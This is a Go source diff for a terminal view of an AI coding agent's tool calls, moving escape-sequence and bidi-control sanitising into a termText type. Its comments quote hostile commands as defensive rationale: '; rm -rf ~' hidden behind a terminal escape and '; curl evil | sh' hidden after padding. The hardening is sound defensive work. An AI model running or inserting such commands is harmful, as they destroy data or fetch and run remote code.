@@ -6,7 +6,6 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
-	"unicode/utf8"
 
 	"github.com/charmbracelet/lipgloss"
 	"github.com/mattn/go-runewidth"
@@ -33,7 +32,7 @@ const shellTailLines = 10
 // toolLine is one row of a tool entry, before the timestamp: its text is
 // already neutralised, its style is ours.
 type toolLine struct {
-	text  string
+	text  termText
 	style lipgloss.Style
 }
 
@@ -41,53 +40,6 @@ var (
 	chatToolHeadStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("252")).Bold(true)
 	chatToolBodyStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
 )
-
-// bidiControls reorder the text a terminal shows (Trojan Source,
-// CVE-2021-42574): what the operator reads would not be what runs.
-var bidiControls = map[rune]bool{
-	'\u061c': true, '\u200e': true, '\u200f': true,
-	'\u202a': true, '\u202b': true, '\u202c': true, '\u202d': true, '\u202e': true,
-	'\u2066': true, '\u2067': true, '\u2068': true, '\u2069': true,
-}
-
-// neutralise makes model- or program-controlled text safe to print to the
-// operator's terminal by SHOWING every character a terminal would act on,
-// never deleting it: a deleted control takes what it hides with it, and a
-// parser that skips "the rest of the sequence" is exactly how "; rm -rf ~"
-// disappears behind an unterminated OSC (#83 review). Each rune is mapped
-// on its own, so nothing next to a control is ever consumed:
-//   - C0 controls and DEL become their Unicode control pictures (ESC is ␛);
-//   - C1 controls, bidi controls and bytes that are not UTF-8 become
-//     <U+XXXX> or <XX>;
-//   - a carriage return that is not part of a line ending becomes a line
-//     break, so a row cannot be overwritten;
-//   - tab and newline stay.
-func neutralise(s string) string {
-	s = strings.ReplaceAll(s, "\r\n", "\n")
-	var b strings.Builder
-	b.Grow(len(s))
-	for i := 0; i < len(s); {
-		r, size := utf8.DecodeRuneInString(s[i:])
-		switch {
-		case r == utf8.RuneError && size == 1:
-			fmt.Fprintf(&b, "<%02X>", s[i])
-		case r == '\n' || r == '\t':
-			b.WriteRune(r)
-		case r == '\r':
-			b.WriteByte('\n')
-		case r < 0x20:
-			b.WriteRune(0x2400 + r)
-		case r == 0x7f:
-			b.WriteRune('␡')
-		case (r >= 0x80 && r <= 0x9f) || bidiControls[r]:
-			fmt.Fprintf(&b, "<U+%04X>", r)
-		default:
-			b.WriteRune(r)
-		}
-		i += size
-	}
-	return b.String()
-}
 
 // isCodingTool reports whether name is one of codingTools.
 func isCodingTool(name string) bool {
@@ -98,7 +50,7 @@ func isCodingTool(name string) bool {
 // of its tool: the command for a shell, the path and range for a read,
 // the pattern for a search. A tool without a shape of its own shows its
 // name and its arguments, cut to 60 characters.
-func toolHeadline(tool, args string) string {
+func toolHeadline(tool, args termText) termText {
 	var a struct {
 		Command string `json:"command"`
 		Path    string `json:"path"`
@@ -113,7 +65,7 @@ func toolHeadline(tool, args string) string {
 		Remote  string `json:"remote"`
 	}
 	if json.Unmarshal([]byte(args), &a) != nil {
-		return strings.Join(strings.Fields(neutralise(fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60)))), " ")
+		return termTextOf(strings.Join(strings.Fields(termTextOf(fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args.String(), 60))).String()), " "))
 	}
 	var head string
 	switch tool {
@@ -140,12 +92,12 @@ func toolHeadline(tool, args string) string {
 	case "git_push":
 		head = strings.TrimSpace("⎇ git push " + a.Remote)
 	default:
-		head = fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60))
+		head = fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args.String(), 60))
 	}
 	// One line, every whitespace run one space: the viewport cuts a row at
 	// the pane width without a marker, so 130 spaces before "; curl evil |
 	// sh" would hide it (#83 review).
-	return strings.Join(strings.Fields(neutralise(head)), " ")
+	return termTextOf(strings.Join(strings.Fields(termTextOf(head).String()), " "))
 }
 
 // readRange is a read's line range as path:first-last, or path:first when
@@ -217,18 +169,18 @@ func lastLines(lines []string, n int) ([]string, int) {
 
 // textLines splits neutralised text into lines, dropping one trailing
 // empty line.
-func textLines(s string) []string {
-	s = strings.TrimSuffix(neutralise(s), "\n")
-	if s == "" {
+func textLines(s termText) []string {
+	t := strings.TrimSuffix(s.String(), "\n")
+	if t == "" {
 		return nil
 	}
-	return strings.Split(s, "\n")
+	return strings.Split(t, "\n")
 }
 
 func indentLines(lines []string, style lipgloss.Style) []toolLine {
 	out := make([]toolLine, 0, len(lines))
 	for _, l := range lines {
-		out = append(out, toolLine{text: "  " + l, style: style})
+		out = append(out, toolLine{text: termTextOf("  " + l), style: style})
 	}
 	return out
 }
@@ -252,7 +204,7 @@ func diffLines(lines []string) []toolLine {
 	out := make([]toolLine, 0, len(lines))
 	var h hunk
 	for _, l := range lines {
-		out = append(out, toolLine{text: "  " + l, style: h.style(l)})
+		out = append(out, toolLine{text: termTextOf("  " + l), style: h.style(l)})
 	}
 	return out
 }
@@ -326,8 +278,8 @@ func (h *hunk) consume(line string) lipgloss.Style {
 func (e *chatEntry) toolCallLines(expanded bool) []toolLine {
 	head := toolLine{text: toolHeadline(e.tool, e.detail), style: chatToolHeadStyle}
 	if e.outcome == nil {
-		if expanded && !codingTools[e.tool] {
-			head.text = strings.Join(strings.Fields(neutralise(fmt.Sprintf("⚙ %s(%s)", e.tool, e.detail))), " ")
+		if expanded && !codingTools[e.tool.String()] {
+			head.text = termTextOf(strings.Join(strings.Fields(termTextOf(fmt.Sprintf("⚙ %s(%s)", e.tool, e.detail)).String()), " "))
 		}
 		return []toolLine{head}
 	}
@@ -336,17 +288,17 @@ func (e *chatEntry) toolCallLines(expanded bool) []toolLine {
 		head.text += " ✗"
 		msg := out.detail
 		if !expanded {
-			msg = truncateForChat(msg, 80)
+			msg = termTextOf(truncateForChat(msg.String(), 80))
 		}
 		return append([]toolLine{head}, indentLines(textLines(msg), chatErrorStyleTUI)...)
 	}
 
 	raw := out.raw
 	if raw == "" {
-		raw = out.detail
+		raw = out.detail.String()
 	}
 	var body []toolLine
-	if res, ok := decodeShellOutcome(raw); ok && (e.tool == "shell_exec" || strings.HasPrefix(e.tool, "git_")) {
+	if res, ok := decodeShellOutcome(raw); ok && (e.tool == "shell_exec" || strings.HasPrefix(e.tool.String(), "git_")) {
 		head, body = shellLines(head, res, expanded)
 	} else {
 		head, body = resultLines(e.tool, head, raw, expanded)
@@ -361,10 +313,10 @@ func (e *chatEntry) toolCallLines(expanded bool) []toolLine {
 // headline, the output under it.
 func shellLines(head toolLine, res shellOutcome, expanded bool) (toolLine, []toolLine) {
 	if *res.ExitCode != 0 {
-		head.text += fmt.Sprintf(" · exit %d", *res.ExitCode)
+		head.text += termTextOf(fmt.Sprintf(" · exit %d", *res.ExitCode))
 	}
 	if res.Error != "" {
-		head.text += " · " + neutralise(collapseNewlines(res.Error))
+		head.text += termTextOf(" · " + collapseNewlines(res.Error))
 	}
 	output := res.Stdout
 	if output != "" && res.Stderr != "" && !strings.HasSuffix(output, "\n") {
@@ -374,9 +326,9 @@ func shellLines(head toolLine, res shellOutcome, expanded bool) (toolLine, []too
 	var note []string
 	if res.OutputFile != "" {
 		output = res.FirstPage
-		note = []string{neutralise(fmt.Sprintf("[%d lines in all; the whole output is in %s]", res.Lines, res.OutputFile))}
+		note = []string{fmt.Sprintf("[%d lines in all; the whole output is in %s]", res.Lines, res.OutputFile)}
 	}
-	lines := textLines(output)
+	lines := textLines(termTextOf(output))
 	if !expanded {
 		var hidden int
 		lines, hidden = lastLines(lines, shellTailLines)
@@ -392,19 +344,19 @@ var searchCount = regexp.MustCompile(`\[(?:end of results: (\d+) match|showing m
 // resultLines renders any other outcome: a read or a search says how much
 // it found, an applied patch shows its diff, and anything else shows its
 // result cut to 60 characters.
-func resultLines(tool string, head toolLine, result string, expanded bool) (toolLine, []toolLine) {
-	all := textLines(result)
+func resultLines(tool termText, head toolLine, result string, expanded bool) (toolLine, []toolLine) {
+	all := textLines(termTextOf(result))
 	switch tool {
 	case "read_file":
-		head.text += fmt.Sprintf(" · %d lines", len(all))
+		head.text += termTextOf(fmt.Sprintf(" · %d lines", len(all)))
 	case "search":
 		switch m := searchCount.FindStringSubmatch(result); {
 		case strings.HasPrefix(result, "[no matches"):
 			head.text += " · no matches"
 		case m != nil && m[1] != "":
-			head.text += fmt.Sprintf(" · %s matches", m[1])
+			head.text += termTextOf(fmt.Sprintf(" · %s matches", m[1]))
 		case m != nil:
-			head.text += fmt.Sprintf(" · %s+ matches", m[2])
+			head.text += termTextOf(fmt.Sprintf(" · %s+ matches", m[2]))
 		}
 	case "write_file":
 		head.text += " ✓"
@@ -413,7 +365,7 @@ func resultLines(tool string, head toolLine, result string, expanded bool) (tool
 		return head, diffLines(all)
 	default:
 		if !expanded {
-			return head, indentLines([]string{"← " + neutralise(truncateForChat(result, 60))}, chatToolBodyStyle)
+			return head, indentLines([]string{"← " + truncateForChat(result, 60)}, chatToolBodyStyle)
 		}
 	}
 	if !expanded {
@@ -446,22 +398,22 @@ func (e *chatEntry) renderToolCall(ts string, expanded bool, width int) string {
 // not fit is cut with a visible "…" collapsed, and wrapped onto rows
 // indented two more columns expanded: never silently shortened (#83
 // review). A width of 0 or less means the pane is not laid out yet.
-func fitToolRow(text string, avail int, expanded bool) []string {
-	text = strings.ReplaceAll(text, "\t", "    ")
-	if avail <= 0 || runewidth.StringWidth(text) <= avail {
-		return []string{text}
+func fitToolRow(text termText, avail int, expanded bool) []string {
+	t := strings.ReplaceAll(text.String(), "\t", "    ")
+	if avail <= 0 || runewidth.StringWidth(t) <= avail {
+		return []string{t}
 	}
 	if !expanded {
-		return []string{runewidth.Truncate(text, avail, "…")}
+		return []string{runewidth.Truncate(t, avail, "…")}
 	}
-	indent := strings.Repeat(" ", len(text)-len(strings.TrimLeft(text, " "))+2)
+	indent := strings.Repeat(" ", len(t)-len(strings.TrimLeft(t, " "))+2)
 	if len(indent) >= avail {
 		indent = ""
 	}
 	var rows []string
 	var row strings.Builder
 	limit, used := avail, 0
-	for _, r := range text {
+	for _, r := range t {
 		w := runewidth.RuneWidth(r)
 		if used+w > limit {
 			rows = append(rows, row.String())
@@ -482,7 +434,7 @@ func (e *chatEntry) toolLines(expanded bool) []string {
 	}
 	var out []string
 	for _, l := range e.toolCallLines(expanded) {
-		out = append(out, l.text)
+		out = append(out, l.text.String())
 	}
 	return out
 }
@@ -546,7 +498,7 @@ func plural(n int, noun string) string {
 
 // openToolCall is the newest entry when it is a call of tool still waiting
 // for its outcome, or nil.
-func (m *Model) openToolCall(tool string) *chatEntry {
+func (m *Model) openToolCall(tool termText) *chatEntry {
 	n := len(m.chatEntries)
 	if n == 0 || tool == "" {
 		return nil
